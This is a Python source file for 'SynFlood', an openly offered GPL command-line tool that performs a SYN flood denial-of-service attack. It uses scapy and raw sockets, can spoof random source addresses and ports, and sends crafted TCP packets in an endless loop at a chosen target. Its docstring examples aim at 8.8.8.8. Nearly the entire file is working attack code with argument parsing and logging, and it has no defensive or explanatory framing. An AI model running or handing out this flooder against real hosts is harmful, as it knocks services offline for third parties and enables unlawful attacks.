#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a SYN flood attack (DOS attack: Denial Of Service).
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a SYN flood attack (DOS attack: Denial Of Service).

>>> from SynFlood import synflood, conf_iface
>>> synflood("8.8.8.8", 80, "0.0.0.0", 45586)
[2016-06-22 12:35:05] WARNING  (30) {SynFlood - SynFlood.py:158} Start the SynFlood attack...
Traceback (most recent call last):
    ...
KeyboardInterrupt
>>> synflood("8.8.8.8", 80, "0.0.0.0", 45586, b"abc", conf_iface)
[2016-06-22 12:35:05] WARNING  (30) {SynFlood - SynFlood.py:158} Start the SynFlood attack...
Traceback (most recent call last):
    ...
KeyboardInterrupt

~# SynFlood 8.8.8.8
[2016-06-22 12:35:05] WARNING  (30) {__main__ - SynFlood.py:146} Start the SynFlood attack...
[2016-06-22 12:35:25] WARNING  (30) {__main__ - SynFlood.py:197} KeyboardInterrupt is raised, stop the SynFlood attack...
[2016-06-22 12:35:25] CRITICAL (50) {__main__ - SynFlood.py:199} End of the SynFlood attack.
~# SynFlood -v -p 80 -s 0.0.0.0 -P 45586 -i 172.16.0. -d abc 8.8.8.8
[2016-06-22 12:35:05] DEBUG    (10) {__main__ - SynFlood.py:161} Logging is configured.
[2016-06-22 12:35:05] INFO     (20) {__main__ - SynFlood.py:171} Interface argument match with (172.16.0.10 00:0f:ae:db:52:5c WIFI)
[2016-06-22 12:35:05] INFO     (20) {__main__ - SynFlood.py:178} Network interface is configured (IP: 172.16.0.10, MAC: 00:0f:ae:db:52:5c and name: WIFI)
[2016-06-22 12:35:05] DEBUG    (10) {__main__ - SynFlood.py:126} Build the packet...
[2016-06-22 12:35:05] DEBUG    (10) {__main__ - SynFlood.py:129} Build send function...
[2016-06-22 12:35:05] DEBUG    (10) {__main__ - SynFlood.py:138} Add raw data...
[2016-06-22 12:35:05] WARNING  (30) {__main__ - SynFlood.py:146} Start the SynFlood attack...
[2016-06-22 12:35:25] WARNING  (30) {__main__ - SynFlood.py:197} KeyboardInterrupt is raised, stop the SynFlood attack...
[2016-06-22 12:35:25] CRITICAL (50) {__main__ - SynFlood.py:199} End of the SynFlood attack.
"""

__version__ = "1.1.3"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a SYN flood attack (DOS attack: Denial Of Service).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SynFlood"

copyright = """
SynFlood  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["main", "synflood"]

from scapy.all import (
    IP,
    TCP,
    RandIP,
    RandShort,
    Raw,
    Ether,
    sendp,
    conf,
    IFACES,
    getmacbyip,
)
from logging import StreamHandler, Formatter, Logger, getLogger, DEBUG, WARNING
from argparse import ArgumentParser, Namespace
from scapy.interfaces import NetworkInterface
from collections.abc import Callable
from functools import partial
from sys import exit, stdout
from platform import system
from typing import List

IS_LINUX: bool = system() == "Linux"
conf_iface: NetworkInterface = conf.iface

if IS_LINUX:
    from socket import socket, SOCK_RAW, AF_PACKET


class ScapyArguments(ArgumentParser):

    """
    This class implements ArgumentsParser with
    interface argument and iface research.
    """

    interface_args: list = ["--interface", "-i"]
    interface_kwargs: dict = {
        "help": "Part of the IP, MAC or name of the interface",
    }

    def __init__(
        self,
        *args,
        interface_args=interface_args,
        interface_kwargs=interface_kwargs,
        **kwargs,
    ):
        super().__init__(*args, **kwargs)
        self.interface_args = interface_args
        self.interface_kwargs = interface_kwargs
        self.add_argument(*interface_args, **interface_kwargs)

    def parse_args(
        self, args: List[str] = None, namespace: Namespace = None
    ) -> Namespace:

        """
        This function implements the iface
        research from interface arguments.
        """

        namespace: Namespace = ArgumentParser.parse_args(self, args, namespace)

        argument_name: str = max(self.interface_args, key=len)
        for char in self.prefix_chars:
            if char == argument_name[0]:
                argument_name = argument_name.lstrip(char)
                break

        interface = getattr(namespace, argument_name, None)

        if interface is not None:
            interface = interface.casefold()

            for temp_iface in IFACES.values():

                ip = temp_iface.ip
                mac = temp_iface.mac or ""
                name = temp_iface.name or ""
                network_name = temp_iface.network_name or ""

                mac = mac.casefold()
                name = name.casefold()
                network_name = network_name.casefold()

                if (
                    (ip and interface in ip)
                    or (mac and interface in mac)
                    or (name and interface in name)
                    or (network_name and interface in network_name)
                ):
                    namespace.iface = temp_iface
                    return namespace

        namespace.iface = conf_iface
        return namespace


def get_custom_logger() -> Logger:

    """
    This function create a custom logger.
    """

    logger = getLogger(__name__)  # default logger.level == 0

    formatter = Formatter(
        fmt=(
            "%(asctime)s%(levelname)-9s(%(levelno)s) "
            "{%(name)s - %(filename)s:%(lineno)d} %(message)s"
        ),
        datefmt="[%Y-%m-%d %H:%M:%S] ",
    )
    stream = StreamHandler(stream=stdout)
    stream.setFormatter(formatter)

    logger.addHandler(stream)

    return logger


def parse() -> Namespace:

    """
    This function parses command line arguments.
    """

    parser = ScapyArguments(
        description="This script implements a SynFlood attack."
    )
    parser_add_argument = parser.add_argument
    parser_add_argument("target", help="Target IP or hostname.")
    parser_add_argument(
        "--dport", "-p", help="Destination port.", default=80, type=int
    )
    parser_add_argument("--source", "-s", help="Source IP.", default=None)
    parser_add_argument(
        "--sport", "-P", help="Source port.", default=None, type=int
    )
    parser_add_argument("--data", "-d", help="Additional data", default=None)
    parser_add_argument(
        "--verbose",
        "-v",
        help="Mode verbose (print debug message)",
        action="store_true",
    )
    return parser.parse_args()


def synflood(
    target: str,
    dport: int,
    source: str,
    sport: int,
    data: bytes = None,
    iface: NetworkInterface = conf_iface,
) -> None:

    """
    This function implements the SynFlood attack.
    """

    logger_debug("Craft the packet...")
    packet = Ether(src=iface.mac, dst=getmacbyip(target)) / IP(dst=target, src=source) / TCP(dport=dport, sport=sport)

    logger_debug("Add raw data...")
    if data:
        packet = packet / Raw(data)

    logger_debug("Get an optimized sending function...")
    if IS_LINUX:
        sock = socket(AF_PACKET, SOCK_RAW)
        try:
            sock.bind((iface.ip, 0))
        except OSError:
            logger_warning("Bind socket failed. Use scapy send function (slower)...")
            send_ = partial(sendp, iface=iface, verbose=0)
        else:
            packet = packet
            send_ = sock.send
            
            logger_debug("Get packet as bytes...")
            packet = bytes(packet)
    else:
        send_ = partial(sendp, iface=iface, verbose=0)

    logger_warning("Start the SynFlood attack...")
    while True:
        send_(packet)


def main() -> int:

    """
    This function executes this script from the command line.
    """

    arguments = parse()
    iface = arguments.iface
    run = True

    logger.setLevel(DEBUG if arguments.verbose else WARNING)
    logger_debug("Logging is configured.")

    logger_info(
        f"Network interface is configured (IP: {iface.ip}, MAC:"
        f" {iface.mac} and name: {iface.name} or {iface.network_name})"
    )

    data = arguments.data
    while run:
        try:
            synflood(
                arguments.target,
                arguments.dport,
                arguments.source or RandIP(),
                arguments.sport or RandShort(),
                data.encode() if data else None,
                iface=iface,
            )
        # except OSError:
        #    print("OSError...")
        except KeyboardInterrupt:
            run = False
            logger_warning(
                "KeyboardInterrupt is raised, stop the SynFlood attack..."
            )

    logger_critical("End of the SynFlood attack.")
    return 0


logger: Logger = get_custom_logger()
logger_debug: Callable = logger.debug
logger_info: Callable = logger.info
logger_warning: Callable = logger.warning
logger_error: Callable = logger.error
logger_critical: Callable = logger.critical

print(copyright)

if __name__ == "__main__":
    exit(main())
